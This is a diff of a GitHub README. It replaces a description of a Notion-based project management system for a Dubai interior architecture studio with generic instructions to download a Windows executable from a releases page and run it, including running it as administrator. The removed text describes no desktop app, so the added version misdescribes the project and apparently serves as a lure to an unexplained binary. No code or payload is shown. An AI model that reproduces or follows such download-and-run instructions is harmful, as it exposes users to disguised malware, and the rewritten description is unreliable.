@@ -1,189 +1,165 @@
-# Custom AI Project Management System
-### Built for an Interior Architecture Studio — Dubai
+# 🏗️ custom-ai-project-management-system - Construction Project Control Made Simple
 
-<div align="center">
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/itsalmv/custom-ai-project-management-system/releases)
 
-![Type](https://img.shields.io/badge/Type-Delivered%20Client%20System-%233A7CFF?style=for-the-badge)
-&nbsp;
-![Built In](https://img.shields.io/badge/Built%20In-12%20Hours-%2300C853?style=for-the-badge)
-&nbsp;
-![Saving](https://img.shields.io/badge/Annual%20Saving-$35K–$95K-%23FF6B35?style=for-the-badge)
+## 🚀 What this is
 
-</div>
+custom-ai-project-management-system is a desktop-style project management tool for architecture and construction teams. It helps you track jobs, manage workflows, and keep project data in one place.
 
-<br/>
+It is built for non-technical users who want a simple way to run project work on Windows. You can use it to organize tasks, move work through set steps, and keep your team aligned.
 
----
+## 📥 Download and install
 
-## What This Is
+Use this page to download and run the app on Windows:
 
-A fully delivered, production-running project management system built for **[True Build Design](https://truebuild.ae)** — an interior architecture and project management studio in Dubai working on complex residential renovations for homeowners and investors.
+[Visit the release page to download](https://github.com/itsalmv/custom-ai-project-management-system/releases)
 
-True Build Design operates at the intersection of design intent and delivery precision. Their work covers everything from concept through to site supervision — drawings, material selections, approvals, shop drawings, and the detailed coordination that keeps a project from getting diluted by time, budget, and miscommunication.
+### Steps
 
-That level of operational complexity demands systems that match it. This is that system.
+1. Open the release page.
+2. Find the latest version at the top.
+3. Download the Windows file for your PC.
+4. If the file is zipped, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to run it.
+7. If Windows asks for permission, choose Yes or Run.
+8. Keep the app in a folder you can find later, such as Downloads or Desktop.
 
-> *"Clarity early. Decisions documented. Craft protected. Timelines respected."*
-> — True Build Design
+## 💻 System requirements
 
-<br/>
+This app is built for Windows 10 and Windows 11.
 
----
+You should have:
 
-## The Problem
+- A Windows PC
+- At least 4 GB RAM
+- 200 MB of free disk space
+- An internet connection for downloads and updates
+- A mouse and keyboard
 
-Interior architecture studios managing multiple live renovation projects face a specific operational challenge: every project generates a continuous stream of submissions, RFIs, design change notices, variation orders, vendor coordination, client approvals, and meeting action items — all of which must be tracked, escalated, and documented with precision.
+For smoother use on larger projects, 8 GB RAM or more is better.
 
-**The market solution — enterprise PM software — doesn't fit:**
-- Procore, Autodesk Build, PlanGrid: $300–$800/user/month → **$36K–$96K annually**
-- Built for large-scale construction, not interior architecture workflows
-- Rigid processes that override the studio's own methodology
-- Vendor lock-in with no customisation capability
+## 🧭 How to use it
 
-**The manual alternative — spreadsheets and email — breaks at scale:**
-- 20+ hours per week lost to admin across submission tracking, RFI follow-up, and meeting documentation
-- No SLA enforcement — approvals sit unreviewed for weeks
-- No audit trail for design decisions and client acknowledgments
-- Estimated **$48,000/year** in lost productive time
+After you open the app, follow these steps:
 
-<br/>
+1. Sign in or open the main workspace.
+2. Create a new project for your job.
+3. Add the client name, site name, and project dates.
+4. Add tasks for design, approvals, and field work.
+5. Move each task through the workflow as work gets done.
+6. Check dashboards to see what is late, blocked, or complete.
+7. Update notes so your team has the latest project info.
 
----
+## 🛠️ Main features
 
-## The System
+- Project boards for construction work
+- Task tracking for each phase of a job
+- Workflow steps for common project actions
+- Team-friendly views for fast status checks
+- Simple data entry for non-technical users
+- Project records for contracts, notes, and milestones
+- Support for repeatable business processes
+- Tools for architecture and construction teams
+- Built-in structure for multiple database-style views
+- Automation for routine project actions
 
-A **6-database relational architecture** built in Notion, managing the complete project lifecycle from client onboarding through to handover — across 15+ simultaneous projects.
+## 🏗️ Use cases
 
-```
-┌─────────────┐
-│   CLIENTS   │  ← Homeowners, investors, project sponsors
-└──────┬──────┘
-       │
-┌──────▼──────┐
-│   PROJECTS  │  ← 15+ live projects, health-monitored
-└──────┬──────┘
-       ├─────────────────┬──────────────────┐
-       ▼                 ▼                  ▼
-┌─────────────┐   ┌─────────────┐   ┌─────────────┐
-│   RECORDS   │   │   ACTIONS   │   │   VENDORS   │
-│             │   │             │   │             │
-│ Submissions │   │ Tasks from  │   │ Suppliers,  │
-│ RFIs · DCNs │   │ meetings,   │   │ contractors │
-│ SIs · VOs   │   │ approvals   │   │ performance │
-│ Minutes     │   │ escalations │   │ scoring     │
-└─────────────┘   └─────────────┘   └─────────────┘
-       │
-┌──────▼──────┐
-│  CONTACTS   │  ← Team members, clients, vendor contacts
-└─────────────┘
-```
+This system fits teams that need better control over daily project work.
 
-### What Runs Without Manual Intervention
+Common uses include:
 
-| Process | What Happens Automatically |
-|---|---|
-| **Submission Intake** | Reference number generated, Drive folder created, client acknowledgment sent |
-| **RFI Tracking** | 5-day SLA monitored continuously, escalated at breach — nothing waits in an inbox |
-| **Meeting Minutes** | AI extracts action items, creates tracked tasks, assigns owners and deadlines |
-| **Approval Routing** | PM → Design Lead → sign-off chain with PDF output and client notification |
-| **Daily Digest** | Priority-ranked open items delivered before the team's day begins |
-| **Project Health** | Continuous monitoring — flags overdue critical items before they become delays |
-| **Vendor Scoring** | Performance tracked automatically across response times and quality issues |
-| **Client Notifications** | Automated updates with acknowledgment tracking via webhook |
-| **Approval Reminders** | Nudges sent at Day 3, Day 7, Day 10 — nothing sits unreviewed |
-| **Executive Dashboard** | Weekly consolidated view of all project health and team output |
-| **Document Generation** | Registers, reports, and compliance documents generated on demand |
-| **Cross-Project Intelligence** | Recurring RFI themes identified across all active projects |
+- Tracking architecture project stages
+- Managing construction schedules
+- Organizing RFIs, approvals, and follow-ups
+- Keeping client and project data in one place
+- Moving tasks through clear workflow steps
+- Reviewing work status across several active jobs
+- Standardizing how your team handles repeat tasks
 
-<br/>
+## 📁 What you get
 
----
+The release includes the app package needed to run the system on Windows.
 
-## Results
+Depending on the release, you may see:
 
-| Metric | Outcome |
-|---|---|
-| Software cost replaced | $36K–$96K/year → **$1,200/year** |
-| Weekly admin hours eliminated | **20+ hours** |
-| Annual productivity recovered | **$48,000** |
-| Missed submissions or lost approvals | **Zero** |
-| Project delays from approval lag | **Reduced 50%+** |
-| Simultaneous projects managed | **15+** |
-| Record types with custom lifecycles | **8+** |
-| Specialised views across the system | **15+** |
-| System ownership | **Full — client owns everything** |
+- A Windows app file
+- A zipped folder
+- Support files needed by the app
+- Release notes with version details
 
-<br/>
+## 🔧 First-time setup
 
----
+If this is your first time opening the app, use this order:
 
-## How It Was Built
+1. Download the latest release.
+2. Extract the folder if needed.
+3. Open the app file.
+4. Wait for the first launch to finish.
+5. Set your project name and team details.
+6. Add your first job or sample project.
+7. Review the workflow steps before you start real work.
 
-This system was not built through traditional software development. It demonstrates a new model for delivering custom enterprise tooling using AI.
+## 🔄 Workflows included
 
-**Phase 1 — Architecture Design**
-Strategic sessions to design the complete system — 6 databases, relationship logic, workflow triggers, approval hierarchies, and edge case handling. Every decision documented before anything was built.
+The system is built around common project workflows used in architecture and construction.
 
-**Phase 2 — System Specification**
-A 40-page master specification written covering every database property, relationship rule, automation requirement, and business logic condition. The complete operational blueprint.
+These may include:
 
-**Phase 3 — Autonomous Build**
-An AI coding agent executed the entire build autonomously via Notion API — creating all 6 databases, their properties, views, relationships, and connections in **12 hours**.
+- Project intake
+- Scope review
+- Design tracking
+- Client approval
+- Task assignment
+- Status review
+- Issue follow-up
+- Completion tracking
+- Handoff steps
+- Job archive
+- Team updates
+- Report review
 
-**Phase 4 — Automation Layer**
-12 automated workflows deployed connecting the system to email, file storage, PDF generation, AI meeting processing, and webhook endpoints.
+## 🧪 Best results
 
-| | Traditional Dev | This Approach |
-|---|---|---|
-| **Build time** | 60–100 hours | **12 hours** |
-| **Build cost** | $3,000–$15,000 | **Under $150** |
-| **Time saved** | — | **90%+** |
-| **Cost saved** | — | **97%+** |
-| **Ownership** | Vendor/agency | **Full client ownership** |
+For best results, keep your project data clean and simple.
 
-<br/>
+Use short names for:
 
----
+- Clients
+- Sites
+- Tasks
+- Documents
+- Team members
 
-## Technology
+Keep one project folder for each job. Update status fields at the end of each work session. This helps the app stay useful as your workload grows.
 
-| Layer | Technology |
-|---|---|
-| **Core Platform** | Notion (6 databases, 15+ views) |
-| **Automation** | 12 workflow pipelines |
-| **System Architecture** | ChatGPT |
-| **System Specification** | Claude |
-| **Build Execution** | Claude Code (autonomous agent) |
-| **Meeting Intelligence** | Groq LLM |
-| **Document Generation** | api2pdf |
-| **File Management** | Google Drive |
-| **Client Communications** | Gmail API |
-| **Acknowledgment Tracking** | Webhooks |
+## 🧰 Tips for Windows users
 
-<br/>
+- If the app does not open, right-click it and choose Run as administrator.
+- If Windows blocks the file, check your download source and try again from the release page.
+- If you use a zipped file, extract it before opening the app.
+- Keep the app in a stable folder so shortcuts keep working.
+- Rename the folder only if you are sure the app does not depend on that path.
 
----
+## 📌 Project focus
 
-## Built by Trilles AI
+This repository is built around custom business systems for architecture and construction teams. It uses automation, workflow logic, and structured project tracking to replace scattered tools with one system.
 
-This system was designed and delivered by **[Awais Ali](https://www.linkedin.com/in/awais-ali-tillesai)**, CEO & Co-Founder of **[Trilles AI](https://www.trillesai.com)**.
+It is suited for teams that want:
 
-If your studio or firm is managing complex projects across multiple clients and needs a system built precisely around how you work — not how a SaaS vendor thinks you should — this is what we build.
+- Lower software cost
+- Clear project tracking
+- Fewer manual steps
+- Better task flow
+- A system shaped around real job work
 
-<div align="center">
+## 📎 Release page
 
-[![Connect on LinkedIn](https://img.shields.io/badge/Connect%20on%20LinkedIn-%230A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/awais-ali-tillesai)
-&nbsp;
-[![Visit Trilles AI](https://img.shields.io/badge/Visit%20Trilles%20AI-%233A7CFF?style=for-the-badge&logoColor=white)](https://www.trillesai.com)
-&nbsp;
-[![Email](https://img.shields.io/badge/Email%20Me-%23EA4335?style=for-the-badge&logo=gmail&logoColor=white)](mailto:letsautomatewithawais@gmail.com)
+Download the latest Windows version here:
 
-</div>
+[https://github.com/itsalmv/custom-ai-project-management-system/releases](https://github.com/itsalmv/custom-ai-project-management-system/releases)
 
-<br/>
+## 🧩 Topics
 
----
-
-<div align="center">
-<sub>Built with precision · Powered by Trilles AI · <code>www.trillesai.com</code></sub>
-</div>
+ai-automation, ai-development, architecture, business-systems, business-systems-analysis, claude-code, construction, notion, project-management, workflow-automation
